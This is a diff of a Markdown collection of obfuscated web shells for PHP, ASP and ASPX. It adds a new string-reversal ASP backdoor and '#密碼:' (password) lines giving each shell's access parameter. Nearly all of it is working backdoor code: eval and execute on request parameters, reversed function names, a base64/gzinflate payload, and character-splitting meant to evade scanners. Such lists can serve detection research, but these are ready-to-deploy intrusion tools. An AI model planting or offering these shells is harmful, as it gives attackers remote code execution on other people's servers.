@@ -8,13 +8,15 @@ eVal ( gzinFlate ( base64_dEcode ('Sy1LzNFQiQ/wDw6JVk/OTVGP1bQGAA==') ) );exit;?
 <?php
  $a=@strrev(ecalper_gerp); 
  $b=@strrev(edoced_46esab);  
- echo @$a($b(L3h4L2Ug),$_POST[jc],axxa);                                              #jc
+ echo @$a($b(L3h4L2Ug),$_POST[jc],axxa);
 ?>
+
+#jc
 
 ------------------------------------------------------------------------------------------------------------
 # ASP:
 ```
-<%eval""&("e"&"v"&"a"&"l"&"("&"r"&"e"&"q"&"u"&"e"&"s"&"t"&"("&"0"&"-"&"2"&"-"&"5"&")"&")")%>   # -7
+<%eval""&("e"&"v"&"a"&"l"&"("&"r"&"e"&"q"&"u"&"e"&"s"&"t"&"("&"0"&"-"&"2"&"-"&"5"&")"&")")%>
 <%eval request("sb")%>
 <%execute request("sb")%>
 <%execute(request("sb"))%>
@@ -26,9 +28,17 @@ eVal ( gzinFlate ( base64_dEcode ('Sy1LzNFQiQ/wDw6JVk/OTVGP1bQGAA==') ) );exit;?
 <%eval request("sb")%>
 <%eval_r(Request("0x001"))%>
 <%ExecuteGlobal request("sb")%>
-
-https://xz.aliyun.com/t/2356
-
+#密碼: -7
+```
+```
+<%
+Function MorfiCoder(Code)
+MorfiCoder=Replace(Replace(StrReverse(Code),"/*/",""""),"\*\",vbCrlf)
+End Function
+Execute MorfiCoder(")/*/z/*/(tseuqer lave")
+%>
+#密碼: z
+```
 ------------------------------------------------------------------------------------------------------------
 # ASPX:
 ```
@@ -37,6 +47,7 @@ https://xz.aliyun.com/t/2356
 "a"+"l"+"("+"R"+"e"+/*-/*-*/"q"+"u"+"e"/*-/*-*/+"s"+"t"+
 "[/*-/*-*/0/*-/*-*/-/*-/*-*/2/*-/*-*/-/*-/*-*/5/*-/*-*/]"+
 ","+"\""+"u"+"n"+"s"/*-/*-*/+"a"+"f"+"e"+"\""+")";eval
-(/*-/*-*/P/*-/*-*/,/*-/*-*/"u"+"n"+"s"/*-/*-*/+"a"+"f"+"e"/*-/*-*/);%>  #-7
-
+(/*-/*-*/P/*-/*-*/,/*-/*-*/"u"+"n"+"s"/*-/*-*/+"a"+"f"+"e"/*-/*-*/);%>
+```
+#密碼: -7
 ------------------------------------------------------------------------------------------------------------
